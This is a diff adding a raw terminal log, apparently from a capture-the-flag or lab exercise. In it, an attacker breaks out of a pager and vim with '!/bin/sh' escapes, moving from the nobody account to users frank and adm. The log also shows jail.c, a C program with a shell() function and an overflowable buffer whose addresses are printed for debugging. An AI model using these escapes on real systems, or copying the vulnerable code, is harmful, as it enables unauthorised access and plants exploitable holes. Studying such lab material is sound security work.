@@ -1,0 +1,78 @@
+/bin/sh: 0: can't access tty; job control turned off
+$ uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ 
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+!//bbiinn//sshh!/bin/sh
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+$ 
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_ansi
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_amiga
+    builtin_dumb
+    builtin_debug
+defaulting to 'ansi'
+[0m[H[2J[24;1H"/var/www/html/jailuser/dev/jail.c"
+<www/html/jailuser/dev/jail.c" [readonly] 40L, 903B[1;1H#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int debug = 0;
+int conn = 0;
+
+void shell(void) {
+    dup2(conn, 0);
+    dup2(conn, 1);
+    dup2(conn, 2);
+    char *argv[] = {"/bin/sh", "-i", NULL};
+    execve("/bin/sh", argv, NULL);
+    _exit(1);
+}
+
+void auth(void) {
+    char userpass[16];
+    char password[256];
+    if (debug) printf("userpass @ %p shell @ %p\n", userpass, shell);
+    printf("Password: ");
+    fflush(stdout);[24;63H1,1[11CTop[1;1H[24;1H[K[24;1H:!/bin/sh[9C[24;1H
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+uid=1001(adm) gid=4(adm) groups=4(adm)
+$ 
+adm
+$ 
+/usr/lib/ruby/gems/3.1.0/gems/net-imap-0.2.3/lib/net/imap/flags.rb
+/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
+/sys/devices/virtual/net/eth1/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/virtual/net/eth0/flags
+$ 
+total 28
+drwxr-xr-x 2 adm  adm  4096 Nov  7 03:05 .
+drwxr-xr-x 1 root root 4096 Nov  7 02:54 ..
+-rw------- 1 adm  adm   833 Nov  7 03:05 .bash_history
+-rw-r--r-- 1 adm  adm   220 May  7  2026 .bash_logout
+-rw-r--r-- 1 adm  adm  3526 May  7  2026 .bashrc
+-rw-r--r-- 1 adm  adm   807 May  7  2026 .profile
+-rw------- 1 adm  adm  1342 Nov  7 03:05 .viminfo
+$ 
+cat: '/home/adm/*.txt': No such file or directory
+$ 
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+$ 
